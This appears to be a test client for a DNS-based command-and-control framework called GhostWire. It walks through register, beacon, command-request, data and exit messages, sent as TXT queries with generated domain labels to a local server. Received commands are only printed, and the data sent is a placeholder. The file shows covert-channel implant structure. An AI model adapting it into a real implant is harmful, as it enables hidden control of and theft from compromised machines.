"""
GhostWire Test Implant
======================
Simulates an implant connecting to the C2 server.
Used for testing — not a real implant.
"""

import sys
import os
import time
import secrets
import dns.resolver  # Ensure dnspython is installed: pip install dnspython

sys.path.insert(0, os.path.dirname(__file__))

from shared.protocol import MSG_REGISTER, MSG_BEACON, MSG_CMDREQ, MSG_EXIT, MSG_DATA, build_query
from shared.config import C2_DOMAIN, DGA_SEED, DGA_LENGTH, DNS_LISTEN_PORT
from shared.dga import DGA



def send_dns_query(query_name, dns_server="127.0.0.1", dns_port=5354):
    """Send a DNS query and return the TXT record response."""
    try:
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [dns_server]
        resolver.port = dns_port
        answers = resolver.resolve(query_name, 'TXT')
        for rdata in answers:
            # dnspython returns TXT as list of byte strings
            text = b''.join(rdata.strings).decode()
            return text
    except Exception as e:
        return f"ERROR: {e}"


def main():
    dga = DGA(seed=DGA_SEED, length=DGA_LENGTH, domain=C2_DOMAIN)
    session_id = secrets.token_hex(4)

    print("=" * 55)
    print("  GhostWire Test Implant")
    print("=" * 55)
    print(f"  Session ID:  {session_id}")
    print(f"  C2 Domain:  {C2_DOMAIN}")
    print(f"  DNS Server:  127.0.0.1:{DNS_LISTEN_PORT}")
    print(f"  Current DGA: {dga.generate()}")
    print("=" * 55)

    dga_label = dga.generate_label()

    # ─── Step 1: REGISTER ───
    print("\n[1] Registering with server...")
    query = build_query(session_id, MSG_REGISTER, dga_label=dga_label, domain=C2_DOMAIN)
    print(f"    Sending: {query}")

    response = send_dns_query(query)
    print(f"    Server response: {response}")

    if response == "ACK":
        print("    ✅ Registered successfully!\n")
    else:
        print(f"    ❌ Registration failed: {response}\n")
        return

    # ─── Step 2: BEACON ───
    print("[2] Sending heartbeat beacon...")
    query = build_query(session_id, MSG_BEACON, dga_label=dga_label, domain=C2_DOMAIN)
    print(f"    Sending: {query}")

    response = send_dns_query(query)
    print(f"    Server response: {response}")

    if response == "ACK":
        print("    ✅ No commands waiting.\n")
    elif response == "CMD":
        print("    ⚡ Command is waiting! Let's ask for it.\n")

    # ─── Step 3: ASK FOR COMMAND ───
    print("[3] Asking server for a command...")
    query = build_query(session_id, MSG_CMDREQ, dga_label=dga_label, domain=C2_DOMAIN)
    print(f"    Sending: {query}")

    response = send_dns_query(query)
    print(f"    Server response: {response}")

    if response == "NOOP":
        print("    ℹ️  No commands available (this is normal).\n")
    elif response.startswith("CMD:"):
        command = response[4:]
        print(f"    ⚡ Received command: {command}\n")

    # ─── Step 4: SEND DATA ───
    print("[4] Sending data back to server...")
    fake_data = "admin"
    query = build_query(session_id, MSG_DATA, encoded_data=fake_data, dga_label=dga_label, domain=C2_DOMAIN)
    print(f"    Sending: {query}")

    response = send_dns_query(query)
    print(f"    Server response: {response}")

    if response == "ACK":
        print("    ✅ Data received by server!\n")

    # ─── Step 5: EXIT ───
    print("[5] Telling server we're shutting down...")
    query = build_query(session_id, MSG_EXIT, dga_label=dga_label, domain=C2_DOMAIN)
    print(f"    Sending: {query}")

    response = send_dns_query(query)
    print(f"    Server response: {response}")

    print("\n" + "=" * 55)
    print("  ✅ Test complete! Check your server terminal.")
    print("=" * 55)


if __name__ == "__main__":
    main()
